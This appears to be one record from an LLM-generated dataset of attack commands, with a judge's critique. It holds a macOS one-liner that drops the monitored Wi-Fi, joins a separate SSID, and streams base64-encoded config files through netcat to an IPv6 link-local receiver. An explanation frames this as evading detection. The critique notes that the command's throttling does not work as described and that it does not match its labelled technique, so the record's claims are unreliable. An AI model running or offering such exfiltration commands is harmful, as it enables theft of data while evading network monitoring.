command: sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 "staging-149" "sTag149%" && tar -C /Users/Shared/exports -czf - configs | openssl base64 -A | while read -r l; do printf "%s\n" "$l" | nc -6 fe80::cafe:5eed:ba11:5eed%en0 53219 -w 1; sleep 0.3; done
explanation: Streams base64-encoded config data line-by-line over a separate Wi‑Fi SSID to an IPv6 link-local receiver on a high port, reducing burst signatures and using an alternate network medium per T1011.
rationale_steps: Ensure no active connection to monitored Wi‑Fi.
Join a staging SSID separate from the primary channel.
Throttle and send line-by-line over IPv6 link-local tied to en0 on a high port.

llm_judgments.syntactic_justification: The one-liner is well-formed with balanced quotes, proper separators (&& and |), valid-looking options, and a correctly structured while loop.
llm_judgments.semantic_justification: It plausibly exfiltrates data over a separate Wi‑Fi SSID to an IPv6 link-local receiver using tar/base64/nc, but the -A option collapses base64 into a single line (defeating line-by-line throttling), networksetup likely needs sudo despite “Privilege: None,” and the activity does not align with the provided System Script Proxy Execution description.
